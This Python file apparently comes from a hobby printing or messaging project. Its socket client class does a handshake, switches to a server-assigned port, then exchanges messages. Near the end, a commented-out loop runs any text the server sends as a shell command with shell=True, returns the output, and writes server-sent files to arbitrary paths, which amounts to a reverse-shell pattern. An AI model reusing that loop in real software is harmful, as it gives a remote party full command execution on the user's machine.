import subprocess,socket,time,os,printer,sys


class talk(object):
    def __init__(self, ip, port):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.hostIp = ip
        self.port = port
        self.last = None
        self.new = None

    def connect(self):#Connects to server and does port nogetiation to its correct port
        try:
            self.socket.connect((self.hostIp, self.port))
            self.socket.sendall('printShake'.encode())
        except:
            print("Failed to connect to host")
        #self.socket.connect((self.hostIp, self.port))
        #self.socket.sendall('printShake'.encode())
        data = self.socket.recv(1024)
        decData = data.decode()
        print(decData)
        print("Swapping to port ", decData[5:])
        self.port = int(decData[5:])
        self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()
        time.sleep(2)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.hostIp, self.port))
        #print("New SCcoket ",self.socket)
    
    def check(self):
        data = self.socket.recv(1024).decode()
        #print("SOCKET REIVED: ",data)
        if data != self.last:
            self.new = data
            self.last = self.new
            return True
        return False
    
    def getMsg(self):
        return self.new

    def send(self, msg):
        self.socket.sendall(msg.encode())
        return self.socket.recv(1024).decode()

    def disconnect(self):
        self.socket.shutdown(socket.SHUT_RDWR)
        self.socket.close()



# while True:
#     data = s.recv(1024)
#     #print(data.decode())
#     decData=data.decode()
#     if decData[:4] == "port":
#         print("Swapping to assinged port ",data[5:])
#         s.shutdown(socket.SHUT_RDWR)
#         s.close()
#         time.sleep(4)
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         port = int(data[5:])
#         s.connect((HOST,port))
#         s.sendall("ID {0}".format(ID).encode())
#     elif decData == "quit":
#         break
#     elif decData == "cd":
#         print("POGGERS")
#     elif decData[:12]=='transferFile':
#         print("transfering file to: ",decData[13:])
#         g = open(decData[13:], 'w')
#         while True:
#             l = s.recv(1024)
#             try:
#                 if l.decode() == 'EOFX': 
#                     break
#             except: 
#                 pass
#             g.write(l.decode())
#         g.close()
#         s.sendall('EOFX'.encode())
#     else:
#         proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#         stdoutput = proc.stdout.read() + proc.stderr.read()
#         stdoutput.decode()
#         s.sendall(stdoutput)
#     #s.sendall('EOFX'.encode())
# s.close()